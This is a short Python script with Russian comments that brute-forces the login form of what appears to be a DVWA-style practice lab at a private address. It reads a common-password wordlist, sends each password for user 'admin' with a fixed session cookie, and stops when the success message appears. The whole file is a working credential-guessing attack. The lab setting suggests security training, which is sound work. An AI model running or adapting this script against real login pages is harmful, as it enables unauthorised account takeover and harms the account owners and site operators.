import requests

# URL вашей уязвимой страницы

# Имя пользователя, которое вы хотите протестировать
# usernames = ['admin','administrarot','user','root','Admin','Administrator']
usernames = ['admin']
with open('10-million-password-list-top-10.txt', "r") as f:
    passwords = f.readlines()
cookies_ = {'PHPSESSID': 'deu867jli8go3kps5qubne0hm3'}
url = f'http://172.17.0.2/vulnerabilities/brute/'
# Удаляем символы новой строки из паролей
passwords = [password.strip() for password in passwords]

for username in usernames:
    for password in passwords:
        # Параметры запроса
        payload = {
            'username': username,
            'password': password
        }
        response = requests.get(url,params=payload,cookies=cookies_)
    
        print(response.url)
        print(response.text)
        if 'Welcome to the password protected area' in response.text:
            print(f"Пароль найден: {password}")
            break
        else:
            print(f"Пароль неверный: {password}")
